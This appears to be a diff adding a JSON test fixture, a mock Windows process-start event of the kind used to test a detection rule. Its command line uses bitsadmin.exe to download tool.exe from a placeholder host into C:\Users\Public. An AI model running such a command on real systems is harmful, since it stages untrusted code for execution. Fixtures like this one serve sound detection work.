@@ -1,0 +1,31 @@
+{
+  "event": {
+    "category": [
+      "process"
+    ],
+    "type": [
+      "start"
+    ],
+    "kind": "event"
+  },
+  "host": {
+    "name": "ws-lab-07",
+    "os": {
+      "type": "windows"
+    }
+  },
+  "user": {
+    "name": "j.doe"
+  },
+  "process": {
+    "name": "bitsadmin.exe",
+    "executable": "C:\\Windows\\System32\\bitsadmin.exe",
+    "command_line": "bitsadmin.exe /transfer job1 /download /priority high http://example.invalid/tool.exe C:\\Users\\Public\\tool.exe",
+    "pe": {
+      "original_file_name": "bitsadmin.exe"
+    },
+    "parent": {
+      "name": "cmd.exe"
+    }
+  }
+}
